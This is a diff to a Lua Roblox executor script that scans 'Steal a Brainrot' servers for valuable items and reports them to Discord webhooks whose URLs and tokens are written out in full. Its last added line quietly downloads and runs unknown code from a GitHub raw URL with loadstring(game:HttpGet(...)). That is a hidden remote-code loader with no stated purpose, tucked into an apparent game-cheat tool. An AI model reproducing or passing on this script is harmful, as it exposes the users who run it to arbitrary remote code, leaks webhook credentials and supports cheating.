@@ -1,20 +1,13 @@
+-- 🎯 BRAINROT INCOME SCANNER v2.1 (4 WEBHOOKS + SPECIAL LIST)
+-- Scans all objects in Steal a Brainrot and sends Discord notifications
+-- Auto-run on start + by F key, copy JobId by G
+
 local Players = game:GetService('Players')
 local UserInputService = game:GetService('UserInputService')
 local HttpService = game:GetService('HttpService')
 local StarterGui = game:GetService("StarterGui")
 
-local ws = WebSocket.Connect("ws://localhost:8000");
-
-ws.OnMessage:Connect(function (message)
-    local json = HttpService:JSONDecode(message)
-
-    if (json.id == "set_sender_success") then
-        print("successfully set sender state!");
-    end
-end)
-
-ws:Send('{"id":"setSenderState"}')
-
+-- ⚙️ WEBHOOK SETTINGS BY INCOME RANGE
 local WEBHOOKS = {
     { -- 0/s - 25M/s
         url = 'https://discord.com/api/webhooks/1457747930126483613/mVEETbblYtBOpbTGQo4Rj1eGQHiSiTO3eIHFij288JrWltyzhYSYlr3ydoNKMbPeemDh',
@@ -47,6 +40,7 @@ local WEBHOOKS = {
     }
 }
 
+-- 📋 SPECIAL BRAINROTS WITH MIN VALUES
 local SPECIAL_BRAINROTS = {
 ['Garama and Madundung'] = 0,
 ['Dragon Cannelloni'] = 0,
@@ -93,6 +87,9 @@ local SPECIAL_BRAINROTS = {
 ['Nuclearo Dinossauro'] = 100_000_000,
 }
 
+print('🎯 Brainrot Scanner v2.1 | JobId:', game.JobId)
+
+-- 🎮 OBJECTS WITH EMOJIS AND IMPORTANCE
 local OBJECTS = {
 ['La Vacca Saturno Saturnita'] = { emoji = '🐄', important = false },
 ['Chimpanzini Spiderini'] = { emoji = '🕷️', important = false },
@@ -183,9 +180,9 @@ local OBJECTS = {
 ['Cuadramat and Pakrahmatmamat'] = { emoji = '🧮', important = true },
 ['Los Cucarachas'] = { emoji = '🪳', important = true },
 ['1x1x1x1'] = { emoji = '💾', important = true },
-['Naughty Naughty'] = { emoji = '🚽🎶🔴⚒🛠👑❌', important = true },
 }
 
+-- IMPORTANT OBJECTS TABLE
 local ALWAYS_IMPORTANT = {}
 for name, cfg in pairs(OBJECTS) do
 if cfg.important then
@@ -193,6 +190,7 @@ ALWAYS_IMPORTANT[name] = true
 end
 end
 
+-- 💰 INCOME PARSER
 local function parseGenerationText(s)
 if type(s) ~= 'string' or s == '' then return nil end
 local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
@@ -366,6 +364,7 @@ searchInGui(playerGui)
 return results
 end
 
+-- 📊 MAIN COLLECT FUNCTION
 local function collectAll(timeoutSec)
 local t0 = os.clock()
 local collected = {}
@@ -408,16 +407,39 @@ if ALWAYS_IMPORTANT[name] then return true end
 return (type(gen) == 'number') and gen >= 1_000_000
 end
 
+-- 🎯 SPECIAL BRAINROT CHECK
 local function isSpecialBrainrot(name, gen)
 local minValue = SPECIAL_BRAINROTS[name]
 if not minValue then return false end
 return gen >= minValue
 end
 
+-- 🔗 EXECUTOR REQUEST
 local function getRequester()
 return http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (KRNL_HTTP and KRNL_HTTP.request)
 end
 
+-- 📋 COPY JOBID TO CLIPBOARD (G KEY)
+local function copyJobIdToClipboard()
+local jobId = game.JobId
+local text = tostring(jobId)
+
+if setclipboard then
+setclipboard(text)
+print("✅ JobId copied to clipboard (setclipboard)")
+else
+local ok, err = pcall(function()
+StarterGui:SetCore("SetClipboard", text)
+end)
+if ok then
+print("✅ JobId copied to clipboard (SetCore)")
+else
+warn("❌ Failed to copy JobId to clipboard:", err)
+end
+end
+end
+
+-- 📤 RANGE SENDER
 local function sendDiscordNotificationByRange(filteredObjects, webhookConfig)
 local req = getRequester()
 if not req then
@@ -530,15 +552,9 @@ print('✅ Notification sent to ' .. webhookConfig.title)
 else
 warn('❌ Failed to send to ' .. webhookConfig.title .. ':', res)
 end
-
-ws:Send(HttpService:JSONEncode({
-    id = "newBrainrot",
-	objectsText = objectsText,
-	jobId = jobId,
-	teleportLua = teleportLua
-}))
 end
 
+-- 🎮 MAIN FUNCTION (4 WEBHOOKS) - FIXED
 local function scanAndNotify()
 print('🔍 Scanning all objects...')
 local allFound = collectAll(8.0)
@@ -564,7 +580,7 @@ for _, obj in ipairs(groups[4]) do
 local emoji = OBJECTS[obj.name] and OBJECTS[obj.name].emoji or '💰'
 print(string.format(' %s %s: %s (%s)', emoji, obj.name, formatIncomeNumber(obj.gen), obj.location or 'Unknown'))
 end
-print(sendDiscordNotificationByRange(groups[4], WEBHOOKS[4]))
+sendDiscordNotificationByRange(groups[4], WEBHOOKS[4])
 else
 for _, obj in ipairs(allFound) do
 if OBJECTS[obj.name] and shouldShow(obj.name, obj.gen) and type(obj.gen) == 'number' then
@@ -592,13 +608,33 @@ end
 
 for i, group in ipairs(groups) do
 if #group > 0 then
-print(sendDiscordNotificationByRange(group, WEBHOOKS[i]))
+sendDiscordNotificationByRange(group, WEBHOOKS[i])
 end
 end
 end
 end
 
+-- 🚀 START
+print('🎯 === BRAINROT INCOME SCANNER v2.1 (4 WEBHOOKS) STARTED ===')
 scanAndNotify()
 
-ws:Close()
+-- ⌨️ RESCAN BY F, COPY JOBID BY G
+local lastScan, DEBOUNCE = 0, 3
+UserInputService.InputBegan:Connect(function(input, gpe)
+if gpe then return end
+
+if input.KeyCode == Enum.KeyCode.F then
+local now = os.clock()
+if now - lastScan < DEBOUNCE then return end
+lastScan = now
+print('\n🔄 === RESCANNING (F) ===')
+scanAndNotify()
+elseif input.KeyCode == Enum.KeyCode.G then
+copyJobIdToClipboard()
+end
+end)
+
+print('💡 Press F to rescan')
+print('📱 4 webhooks ready: 3 by income range + 1 for special brainrots!')
+print('📋 Press G to copy current JobId to clipboard')
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Her0brine404/dghjmb/refs/heads/main/asfd"))()
